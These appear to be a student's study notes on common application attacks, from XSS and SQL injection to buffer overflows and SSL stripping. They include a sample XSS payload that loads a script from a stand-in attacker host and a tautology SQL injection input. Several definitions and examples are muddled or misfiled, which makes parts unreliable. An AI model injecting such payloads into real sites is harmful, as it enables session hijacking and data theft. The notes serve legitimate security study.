# Privilege escalation

- The attacker gains full access to a system

   - Usally exploits a vulnerability  

   - Malware can catch any privilage escalation 



- **Example** - CVE-2020-1530 Windows Remote Access Elevation of Privelage vulnerability august 20, 2020



# Cross-site scripting

- A malicious script hosted on the attacker's site or coded in a link injection onto a trusted site designed to compromise clients browsing the trusted site.

  - Also known as XSS

  - Orginally associated with a browser security flaws; Information from one site to another could be shared



- Process of an XSS attack

1. The attacker indentifies an input validation vulnerability in a trusted site

2. The attacker crafts a URL to perform a code injection against the trusted site. 

3. When the user clicks the link, the trusted site returns a page containing the malicious code injected by the attacker



- **Example** - Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.



- **Non-persistant XSS attack**

    - seach box is a common source 

    - Sent through link that activates payload 

    - Hacker can get session id and more information



- **Persistent XSS attack** 



    - Includes a malicious payload 

    - The malicious message has the virus and everyone gets it when the message is read 

    - There isnt someone targeted; different from non-persistant where the person can be targeted 

    - Can spread easy through social media



    - **Example** - Subaru website gave you a log in token when you entered the website. The log in token never expired, therefore if someone got ahold of this token, theu could log in. 



# Injection

- Adding your own information in a data stream 

  - Enabled because of bad programming 



- Different data types such as HTML,SQL,XML,LDAP,etc.



# SQL injection

- An attack that injects a database query into the input data directed at a server by accessing the client side of the application

  - SQL stands for Structured Query Language



- **Example** -A log in with username and password with a website. Authentication token doesn’t verify so you can add or "1"=1 which will pull up all the data. 



# DLL injection 

- A software vulnerability that can occur when a Windows-based application attempts to force another running application to load a Dynmaic Link Library

  - Also known as Dynamic-Link Library 

  - A windows library containing code and data 



- **Example** The hacker will inject data into a process that will then create a new thread which will give the hacker more rights then he has.



# XML injection 

- A system for structurng documents so that they are human- and machine-readable. 

  - Extensible Markup Language 

  - Transfer data between two different devices



- Modify XML request, a good system can valiadte if the request is valid



- Data submitted via XML with no encryption or input validation is vulnerable to spoofing, request forgery, and injection of arbitrary data or code.



# LDAP injection

- An application that targets webbased application by fabricating LDAP statements that are created by user input.

  - Also known as Lightweight Directory access protocol 

  - Used to store data like username and password 

  - You can gather information by modifiying request



# Pointer/object dereference

- Pointer derefernce

  - A software vulnerability that can occur when code attempts to read a memory location specified by a pointer.

  - In C/C++ programming, a pointer is a variable that stores a memory location rather than a value

  - When it retrieves value, it is known as dereference. 

  - The hacker tries to get value located in a computer memory



#  Directory traversal attack

- An application attack that allows access to commnds, files, and directories that may or may not be connected to a web document root directory

  - An HTTP attack which allows attackers to access restricted directories. 

  - Two levels of security; Access control list and Root Directory 



# Buffer overflows

- An attack on which data goes past the boundary of the destination buffer and begins to corrupt adjacent memory.

  - This allows the attacker to crash the system or execute arbitrary code

  - When one section of memory overwites another bit of memory



- Takes advantage of poor programming; devs need to preform bound checking 

  - Takes time to avoid crashing 

  - A hacker can take advantage of an empty string thar overflows in another value. This can give the hacker access that he wouldnt have had previously before



![image](https://user-images.githubusercontent.com/81980702/120080701-c8f7e180-c07f-11eb-8281-cffa977a9282.png)

> Infographic of what a bufferover does.



# Race conditions

- A software vulnerability when the resulting outcome from execution processes is directly dependent on the order and timing of certain events, those eventsfail to execute in the order and timing of the developer

  - Happens when a computing system that is designed to handle task is forced to preform two or more operations. 



- The technique takes advantage of a time gap that allows the security to lag behind. **Time of check/time of use**.



- **Example** - in the 1980s, a race condition in a threapy machine caused 100 times the normal dose of radiation. 



# Error handling

- Detailed error message include on potential flaws, stack traces, database dumps, and error codes. Can point a hacker in the right direction

  - Improper handling of errors can lead to security problems



# Improper input handling

- Poor input can cause alot of security vulnerabilities 

  - proper validation is to identify the correct form of data



- Devs need to check to make sure that every input doesn’t allow SQL injections, buffer overflows, denial of service, etc. 

  - Takes time for hackers to find the input



# Replay attack

- The attacker needs access to raw network data; Network tap, ARP poisoning, Malware on the victums computer

  - Useful information is transmitted over the network 



- They gather informatiom to help the attacker; they replay the data to appear as someone else 

  - Not an on-path attack; doesn't require the original workstation. 



- **Pass the hash**

  - The client sends a hash to the server which is then caught by the attacker. The attacker then sends the hash back. 



# Session replays

- The hacker gets access to the session Id; The user has the session so he can avoid log-ins every time they enter the site. 

  - The hacker uses this session ID to then log into the webserver. 



# Integer overflow

- An attack in which a computed result is too large to fit in its assigned storage space, which may lead to crashing or data corruption

  - When a value is moved into a variable that is too small to hold it. 

  -  Downcasting from a long to an int is an example. 



# Cross-site requests 

- Cross-site request are common and legitimate; a browser can load stuff from youtube, Instagram, and other text

  - HTML on a website can direct request from your browser which is fine 

  - A lot of request is unauthenticated



- **Client-side**

  - Renders the page on the screen; HTML, JavaScript

- **Server-side**

  - Performs requests from the client: HTML,PHP; Transfer money from one account to another



# Cross-site request forgery

- Takes advantage of the trust that a web application has for the user; The website trust your browser, The request is made without consent; Attacker can post a Facebook status

  - One-click attack, session riding; XSRF,CSRF



- Web application needs to have anti-forgery techniques. 



![image](https://user-images.githubusercontent.com/81980702/120081777-e5e2e380-c084-11eb-80fe-516dee6bec1e.png)

> Infographic of CSRF or XSRF



- **Example** - Server-side request: Attacker finds a vulnerable web application; sends request to a web server; Web server performs the request on behalf of the attacker



# Application programming interface (API) attacks

- Attackers look for vulnerabilities in this communication path

  - sensitive data, DoS, intercept the communication, privileged access

  -  API request from a phone instead of an HTTP computer



# Resource exhaustion

- A specialized DoS attack 



- **ZIP bomb** 

    - 42 kilobyte .zip compressed file. When uncompressed, it is 4.5 petabytes; identity by antivirus. 

- **DHCP Starvation**

  - Attacker floods the network with IP address requests. MAC address changes so the DHCP server will eventually run out of addresses 



# Memory leak 

- A software vulnerability can occur when software does not release allocated memory when it is done using it.



- Unused memory is not properly released

  - Begins to grow slowly in size 

  - System crashes 



# Secure sockets layer (SSL) stripping

- Combines on-path attack with a downgrade attack

  - Attacker sits in the middle of the attack with the client and server



- Proxy server, ARP spoofing, Rouge WI-FI hotspot

  - Software and browser needs to be updated to be countered



- How to counteract

  - the user and the server expect to receive an HTTPS instead of HTTP which stops the man in the middle attack.



# Driver manipulation

- Drivers are powerful, they are often trusted. 



- Shimming

  - A fit in the gap. A middle man

  - Windows has a shim which allows the older application to run in the new version of windows

  - Malware takes advantage of shims 



- Refactoring 

  - A different program each time it is downloaded



- Make it appear different every time; Add useless code

  - All this is used to mask against an antivirus software
